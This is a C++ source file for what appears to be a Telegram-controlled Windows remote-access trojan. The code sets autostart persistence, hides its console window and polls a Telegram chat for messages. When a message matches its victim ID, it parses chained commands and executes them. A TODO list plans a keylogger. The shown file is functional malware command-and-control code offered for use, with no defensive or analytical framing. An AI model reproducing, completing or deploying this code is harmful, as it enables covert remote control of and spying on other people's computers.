#include <iostream>
#include <time.h>
#include <nlohmann/json.hpp>
#include <cpr/cpr.h>
#include "features.hpp"
#include "commands.hpp"

using namespace std;
using json = nlohmann::json;

constexpr int REFRESH = 2; //in seconds
constexpr bool AUTOSTART = 1; 
constexpr bool HIDE_TERMINAL = 1;

int main() {
	if(AUTOSTART) autostart();
	if(HIDE_TERMINAL) ShowWindow(::GetConsoleWindow(), SW_HIDE);
	startup();

	int last(-1); 	fstream file;

	while (true) {
		Sleep(REFRESH * 1000);
		json message = GetLastMessage();

		if (last == message["message_id"]) continue; //continue if that request is already done
		if (time(nullptr) - message["date"] > REFRESH + 3) continue; //continue if that request is too old

		last = message["message_id"].get<int>();
		
		string id = "", command = "", parameters = "";
		string parse = message["text"];
		if (parse == "ALL_ID") {
			cout << "ALL_ID\n";
			Send(ID);
			continue;
		}
		queue<pair<string, string>> Q; //command, parameters
		for (size_t i = 0, it = 0; i < parse.size(); i++) //parsing message
		{
			if (parse[i] == ' ') {
				it++; if (it <= 2)continue;
			}

			if (parse.size() - i > 4) {
				if (parse[i - 1] == ' ' && parse[i] == '&' && parse[i + 1] == '&' && parse[i + 2] == ' ') {
					Q.push({ command, parameters.substr(0,parameters.size()-1)});
					command.clear(); parameters.clear();
					it = 1;
					i += 2; continue;
				}
			}

			if (it == 0)id += parse[i];
			if (it == 1)command += parse[i];
			if (it > 1)parameters += parse[i];

		}
		Q.push({ command, parameters });

		if (ID == id) { 
		    cout << "ID passed, command: " + parse.substr(id.size()+1, TELEGRAM_MAX) << endl;
			while (!Q.empty()) {
				if (Q.front().first.empty()) continue;
				if (Q.front().second.empty())Q.front().second = "NULL";
				commands(Q.front().first, Q.front().second);
				Q.pop();
			}
		}
	}
}

/*
* TODOLIST
-make a handler for turing off
-settings.json
-make keylogger
                        //////WHEN EVERYTHING UPPER WILL BE DONE THEN IT'S VERSION 3.0
-learn git
-start writing own app and api instead of telegram
-make it still compatibile with telegram, just other main.cpp for telegram and other for app
*/